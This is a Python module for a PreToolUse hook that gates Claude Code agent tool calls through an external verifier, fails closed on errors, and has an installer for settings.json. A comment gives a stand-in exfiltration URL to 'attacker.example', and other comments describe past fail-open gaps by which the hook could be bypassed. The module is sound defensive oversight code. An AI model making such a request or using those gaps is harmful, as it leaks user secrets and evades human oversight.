"""
Arcezia ⨉ Claude Code — PreToolUse hook.

This is the *never-missed* integration for the Claude Code CLI agent. It runs as
a `PreToolUse` hook, which the Claude Code harness invokes before EVERY tool
call. Because the harness — not the agent — runs the hook, the agent cannot opt
out of it: every consequential action crosses this checkpoint, including
built-in tools you never enumerated.

Verdict → harness permission decision:
    ALLOW  → "allow"   (tool runs)
    BLOCK  → "deny"    (tool is refused; the reason is shown to Claude)
    REVIEW → "ask"     (Claude Code prompts YOU to approve — your keystroke is
                        the human authorization that grounds the action; the
                        agent cannot forge it)

Read-only tools (Read, Glob, Grep, LS, …) are not consequential and pass through.

Install (writes the hook into ~/.claude/settings.json):
    arcezia-hook install            # or: python -m arcezia.integrations.claude_code install

Hook protocol: stdin = JSON {tool_name, tool_input, ...}; stdout = JSON with
hookSpecificOutput.permissionDecision. Exit 0 always (the decision is in the JSON).
"""
from __future__ import annotations

import json
import os
import sys
from typing import Optional

from arcezia.integrations._common import ACTION_KEYS, describe
from arcezia.integrations._params import scalar_params

# Tools that never produce an irreversible effect — pass straight through.
#
# This frozenset is a DECLARATION channel: every name in it is an assertion
# that the tool is harmless, and the hook never verifies what it lists. So the
# bar is "produces no effect outside this machine", not "the harness calls it a
# read". WebFetch and WebSearch were listed and are not: WebFetch issues an
# outbound request to a URL the AGENT chooses, which is the exfiltration
# channel this product exists to close — https://attacker.example/?d=<secret>
# is a read to the harness and a send to the customer (A5-11). They are mapped
# as outbound actions below instead.
_READ_ONLY_TOOLS = frozenset({
    "Read", "Glob", "Grep", "LS", "NotebookRead", "TodoWrite", "TodoRead",
})

# Outbound tools: the payload leaves the machine, so the domain is the one the
# outbound-axis rules and the cross-step exfiltration scan read — agent_action,
# never the filesystem default.
_OUTBOUND_TOOLS = {
    "WebFetch": "fetch_url",
    "WebSearch": "web_search",
}

# How each consequential Claude Code tool maps to an Arcezia action. The domain
# default routes through filesystem_ops (it carries the destructive-action
# handling and extends the structural-primitive base), so a coding agent's
# shell + file writes are evaluated against real rules. Override the domain with
# ARCEZIA_DEFAULT_DOMAIN.
_DEFAULT_DOMAIN = os.environ.get("ARCEZIA_DEFAULT_DOMAIN", "filesystem_ops")


def map_tool(tool_name: str, tool_input: dict) -> Optional[tuple[str, str, str]]:
    """
    Map a Claude Code tool call to (action_type, action_description, domain).
    Returns None for read-only / non-consequential tools (let them run).
    """
    if tool_name in _READ_ONLY_TOOLS:
        return None

    ti = tool_input or {}
    if tool_name in _OUTBOUND_TOOLS:
        # The URL / query IS the action: it is what leaves the machine.
        target = ti.get("url") or ti.get("query") or ti.get("prompt") or ""
        return (_OUTBOUND_TOOLS[tool_name], f"{tool_name} {target}".strip(), "agent_action")
    if tool_name == "Bash":
        cmd = ti.get("command", "")
        return ("run_shell", cmd, _DEFAULT_DOMAIN)
    if tool_name in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
        path = ti.get("file_path") or ti.get("notebook_path") or ""
        verb = "write_file" if tool_name == "Write" else "edit_file"
        # Include the path AND a snippet of new content so structural probes can
        # see secrets / critical paths.
        snippet = ti.get("content") or ti.get("new_string") or ""
        desc = f"{verb} {path} {snippet}".strip()
        return (verb, desc, _DEFAULT_DOMAIN)

    # Unknown / MCP / custom tool: still gate it — never-missed means we do not
    # silently pass an unrecognised consequential tool. Describe it generically,
    # with EVERY field: this was `json.dumps(ti)[:300]`, which put an MCP tool's
    # payload past the cliff at 302 characters (A5-5).
    return (tool_name.lower(), describe(tool_name, kwargs=ti, priority=ACTION_KEYS),
            _DEFAULT_DOMAIN)


def _decision(permission: str, reason: str) -> dict:
    return {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": permission,           # "allow" | "deny" | "ask"
            "permissionDecisionReason": reason,
        }
    }


def run_hook(stdin_text: str, *, verifier=None, data_subject_reference=None) -> dict:
    """
    Pure hook core (no I/O) — returns the JSON dict to print.

    `verifier`: an object with a .verify(action_type, action_description, domain)
    method returning a cert with .allow/.block/.review/.summary. Defaults to a
    real Arcezia client built from env (ARCEZIA_API_KEY, ARCEZIA_API_URL, TASK).
    On any client/transport error the client's own on_error policy decides
    (default fail-closed → we surface "deny").

    `data_subject_reference`: optional identifier for the person this tool call
    is about, attached to the verification. Record-only — never changes the
    verdict. In the default CLI mode set ARCEZIA_DATA_SUBJECT in the
    environment instead. Applied only when the verifier supports it (the real
    client does); a custom verifier without set_data_subject is left alone.
    """
    try:
        payload = json.loads(stdin_text) if stdin_text.strip() else {}
    except json.JSONDecodeError:
        # Malformed hook input — fail safe: ask the human rather than allow.
        return _decision("ask", "Arcezia: could not parse tool input; manual review.")
    if not isinstance(payload, dict):
        # Valid JSON that is not an object — `[]`, `null`, `"x"`, `3`. It
        # parsed, so the branch above never sees it, and the `.get` calls below
        # raised AttributeError out of run_hook: a crash is not a decision.
        return _decision(
            "deny", "Arcezia: hook input is not a JSON object, so no action "
                    "could be identified or verified (fail-closed).")

    tool_name = payload.get("tool_name", "")
    tool_input = payload.get("tool_input", {}) or {}
    if not isinstance(tool_input, dict):
        return _decision(
            "deny", "Arcezia: tool_input is not a JSON object, so the action's "
                    "arguments could not be read (fail-closed).")

    mapped = map_tool(tool_name, tool_input)
    if mapped is None:
        return _decision("allow", f"{tool_name} is read-only.")

    action_type, action_description, domain = mapped

    # Law Ω/P: CONSTRUCTING the verifier is part of verifying. It was outside
    # this try, so an outage while ~/.claude/arcezia.json carries a
    # capability_envelope (start_session raises ArceziaUnavailableError), a bad
    # ARCEZIA_API_URL scheme or a mistyped ARCEZIA_ON_ERROR (ValueError) all
    # escaped run_hook as a traceback. The harness reads a non-zero, non-2 exit
    # as a NON-BLOCKING error and runs the tool — a construction failure was a
    # fail-open (A5-2). Same try, so every failure becomes a deny.
    try:
        if verifier is None:
            verifier = _default_verifier()
            if verifier is None:
                # No API key configured — an honest absence, not a failure. Do
                # not silently allow a consequential tool; put it to the human.
                return _decision(
                    "ask", "Arcezia not configured (set ARCEZIA_API_KEY); manual review.")

        if data_subject_reference is not None and callable(
            getattr(verifier, "set_data_subject", None)
        ):
            verifier.set_data_subject(data_subject_reference)

        # Typed hook tool_input -> probe lookup keys (bounds-safe projection).
        # The verifier contract predates action_parameters, and a user-supplied
        # verifier with a strict .verify signature would raise TypeError on the
        # extra kwarg — which the fail-closed handler below would convert into a
        # DENY, breaking a working setup. Pass it only when the verifier's
        # signature accepts it (named or **kwargs); otherwise omit — behaviour is
        # then exactly the pre-change contract.
        _extra: dict = {}
        try:
            import inspect as _inspect
            _sig_params = _inspect.signature(verifier.verify).parameters
            if "action_parameters" in _sig_params or any(
                p.kind is _inspect.Parameter.VAR_KEYWORD for p in _sig_params.values()
            ):
                _extra["action_parameters"] = scalar_params(tool_input)
        except (TypeError, ValueError):
            pass  # unintrospectable verifier — omit the kwarg, never break the call

        cert = verifier.verify(
            action_type=action_type,
            action_description=action_description,
            domain=domain,
            **_extra,
        )
    except Exception as exc:  # fail-closed default surfaces here
        return _decision("deny", f"Arcezia could not verify the action (fail-closed): {exc}")

    if cert.block:
        return _decision("deny", f"Arcezia BLOCK: {cert.summary}")
    if cert.degraded:
        return _decision("deny", f"Arcezia DENY (degraded cert — unverified): {cert.summary}")
    if not cert.is_clean():
        # T7: the server did not report whether fabricated evidence was found
        # (or a cross-step pattern fired). An unreported check is not a passed
        # one, and this hook is a gate, so the unknown denies.
        return _decision(
            "deny",
            f"Arcezia DENY (not cleared: {cert.fabrication_status}): {cert.summary}")
    if cert.review:
        # Default: "ask" (prompt the human — their keystroke grounds the action).
        # Strict mode (ARCEZIA_REVIEW_MODE=deny): REVIEW halts HARD — the agent
        # must change the action or re-request with real grounding. This only
        # moves verdicts toward blocking (fail-safe direction) and never alters the
        # engine's verification logic, so it does not inflate the engine's FPR —
        # it is an enforcement-policy choice for high-security deployments.
        if os.environ.get("ARCEZIA_REVIEW_MODE", "ask").lower() == "deny":
            return _decision("deny", f"Arcezia REVIEW→strict-deny (re-request with grounding): {cert.summary}")
        return _decision("ask", f"Arcezia REVIEW (approval required): {cert.summary}")
    # Allow is POSITIVE, not "everything the branches above did not catch". The
    # chain used to end in a bare `return _decision("allow", ...)`, so a verdict
    # that is neither ALLOW nor BLOCK nor REVIEW — a renamed value, an empty
    # string, a lowercase "allow" from some future server — satisfied no branch
    # and landed on allow. `cert.allow` is the conjunction (verdict is the
    # literal "ALLOW", fabrication not detected, no cross-step block), and the
    # sibling n8n and MCP surfaces now read the same way (A5-3 / A5-4 shape).
    if cert.allow:
        return _decision("allow", f"Arcezia ALLOW: {cert.summary}")
    return _decision(
        "deny",
        f"Arcezia DENY — the response carried no recognised verdict "
        f"({cert.verdict!r}), so nothing authorised this action: {cert.summary}")


def _load_capability_envelope() -> dict | None:
    """Load capability_envelope from ~/.claude/arcezia.json if it exists.

    Production pattern: human defines authority scope in a config file.
    The hook reads it at startup and injects into the session.

    A file that is NOT there is an honest absence: no envelope was declared, and
    the session opens without one. A file that IS there and cannot be read is a
    different fact, and it used to produce the same value — `except Exception:
    return None`. An envelope's axes set False are DENIALS, so silently dropping
    an unreadable one WIDENS authority: the hook would then verify against no
    declared scope at all and never say so. Law Ω: unreadable is not empty. It
    raises, `_default_verifier` is called inside `run_hook`'s try, and the hook
    answers deny with the reason.
    """
    config_path = os.path.expanduser("~/.claude/arcezia.json")
    if os.path.exists(config_path):
        import json as _json
        try:
            with open(config_path) as f:
                cfg = _json.load(f)
        except (OSError, ValueError) as exc:
            raise RuntimeError(
                f"{config_path} exists but could not be read ({exc}). It declares "
                f"the authority scope this hook verifies against, and an axis it "
                f"sets False is a denial — proceeding without it would grant "
                f"more than the file allows. Fix or remove the file."
            ) from exc
        if not isinstance(cfg, dict):
            raise RuntimeError(
                f"{config_path} is not a JSON object, so no capability envelope "
                f"could be read from it."
            )
        return cfg.get("capability_envelope")
    return None


def _default_verifier():
    api_key = os.environ.get("ARCEZIA_API_KEY", "").strip()
    if not api_key:
        return None
    from arcezia.client import Arcezia
    az = Arcezia(
        api_key=api_key,
        task=os.environ.get("TASK", os.environ.get("ARCEZIA_TASK", "")),
        api_url=os.environ.get("ARCEZIA_API_URL", "https://api.arcezia.com"),
        on_error=os.environ.get("ARCEZIA_ON_ERROR", "fail_closed"),
        # Record-only data subject for per-person audit lookup; the hook is
        # env-configured, so the env var is its constructor.
        data_subject_reference=os.environ.get("ARCEZIA_DATA_SUBJECT") or None,
    )
    # The hook denies on a degraded certificate (see the PreToolUse handler),
    # so ARCEZIA_ON_ERROR=fail_open does not keep Claude Code running through
    # an outage — it changes nothing here. Said once, at construction.
    from arcezia.integrations._common import warn_if_fail_open
    warn_if_fail_open(az)

    # Load capability_envelope from config (human-defined authority scope)
    envelope = _load_capability_envelope()
    if envelope:
        az.start_session(capability_envelope=envelope)
    return az


# ── settings.json install helper ──────────────────────────────────────────────

def _hook_command() -> str:
    """The command Claude Code should run for the hook.

    It used to be the bare string ``python -m arcezia.integrations.claude_code
    hook``. ``python`` is resolved by the harness's PATH, not by the
    interpreter arcezia is installed into, so a venv install plus a system
    ``python`` gave ``ModuleNotFoundError`` → exit 1, and a machine with no
    ``python`` on PATH gave exit 127. Both are non-blocking errors to the
    harness: the tool runs (A5-2). Name the interpreter, or the console script
    that already carries it, so the hook cannot be missing at run time.
    """
    import shlex
    import shutil
    console = shutil.which("arcezia-hook")
    if console:
        return f"{shlex.quote(console)} hook"
    return f"{shlex.quote(sys.executable)} -m arcezia.integrations.claude_code hook"


_HOOK_COMMAND = _hook_command()

# Any earlier spelling of the same hook. Used only so `install()` recognises a
# hook it (or an older version) already wrote and does not append a second one.
_HOOK_MARKERS = ("arcezia.integrations.claude_code", "arcezia-hook")


def _is_arcezia_hook(command: object) -> bool:
    return isinstance(command, str) and any(m in command for m in _HOOK_MARKERS)


def settings_snippet() -> dict:
    """The PreToolUse hook block to merge into ~/.claude/settings.json."""
    return {
        "hooks": {
            "PreToolUse": [
                {"matcher": "*", "hooks": [{"type": "command", "command": _HOOK_COMMAND}]}
            ]
        }
    }


def install(settings_path: Optional[str] = None) -> str:
    """
    Merge the PreToolUse hook into the user's Claude Code settings.json.
    Returns the path written. Idempotent — does not duplicate the hook.

    Refuses rather than overwrites when the existing file cannot be parsed.
    A ``json.JSONDecodeError`` used to be swallowed into ``settings = {}``,
    which turned the merge into a FULL OVERWRITE: the user's
    ``permissions.deny`` list — a security control — plus every other hook and
    every env var were destroyed with no warning and no backup (A5-12). A
    comment, a trailing comma, a BOM or a truncated previous write was enough.
    Superseding a fact requires keeping the trail, so: on a parse error we
    raise and name the path, and on every real write we copy the original to a
    timestamped ``.bak-`` first.
    """
    from pathlib import Path
    path = Path(settings_path or os.path.expanduser("~/.claude/settings.json"))
    path.parent.mkdir(parents=True, exist_ok=True)
    settings: dict = {}
    original: Optional[str] = None
    if path.exists():
        original = path.read_text()
        try:
            settings = json.loads(original)
        except json.JSONDecodeError as exc:
            raise ValueError(
                f"{path} is not valid JSON ({exc}), so Arcezia will not write to "
                f"it — merging into an unparseable file would silently replace "
                f"whatever it holds, including your permissions.deny rules. Fix "
                f"the file (or move it aside) and run install again. To see the "
                f"block to add by hand: arcezia-hook print-config"
            ) from exc
        if not isinstance(settings, dict):
            raise ValueError(
                f"{path} holds a JSON {type(settings).__name__}, not an object; "
                f"Arcezia will not replace it. Fix or move the file and retry."
            )
    hooks = settings.setdefault("hooks", {})
    pre = hooks.setdefault("PreToolUse", [])
    if not any(
        _is_arcezia_hook(h.get("command"))
        for entry in pre for h in entry.get("hooks", [])
    ):
        pre.append({"matcher": "*", "hooks": [{"type": "command", "command": _HOOK_COMMAND}]})
    if original is not None:
        import time
        backup = path.with_name(f"{path.name}.bak-{int(time.time())}")
        backup.write_text(original)
    path.write_text(json.dumps(settings, indent=2))
    return str(path)


def main(argv: Optional[list[str]] = None) -> int:
    argv = argv if argv is not None else sys.argv[1:]
    if argv and argv[0] == "install":
        written = install()
        print(f"Arcezia PreToolUse hook installed → {written}")
        print("Set ARCEZIA_API_KEY (and optionally TASK) in your environment.")
        return 0
    if argv and argv[0] == "print-config":
        print(json.dumps(settings_snippet(), indent=2))
        return 0
    # Default: act as the hook (read stdin, emit decision).
    #
    # "Exit 0 always (the decision is in the JSON)" is this module's contract
    # (see the module docstring). It is ENFORCED here rather than assumed: the
    # harness treats any non-zero, non-2 exit as a non-blocking error and runs
    # the tool, so a crash anywhere below — reading stdin, a verifier the
    # try in run_hook cannot reach, an encoding error on print — would be a
    # fail-open. BaseException, not Exception: a KeyboardInterrupt or a
    # MemoryError mid-hook must still leave a decision behind.
    try:
        out = run_hook(sys.stdin.read())
    except BaseException as exc:                    # noqa: BLE001 — deliberate
        out = _decision(
            "deny",
            f"Arcezia hook failed before it could decide (fail-closed): "
            f"{type(exc).__name__}: {exc}",
        )
    try:
        print(json.dumps(out))
    except BaseException:                           # noqa: BLE001 — deliberate
        # Even serialising the decision must not turn into a non-zero exit.
        print('{"hookSpecificOutput": {"hookEventName": "PreToolUse", '
              '"permissionDecision": "deny", "permissionDecisionReason": '
              '"Arcezia hook could not emit a decision (fail-closed)."}}')
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
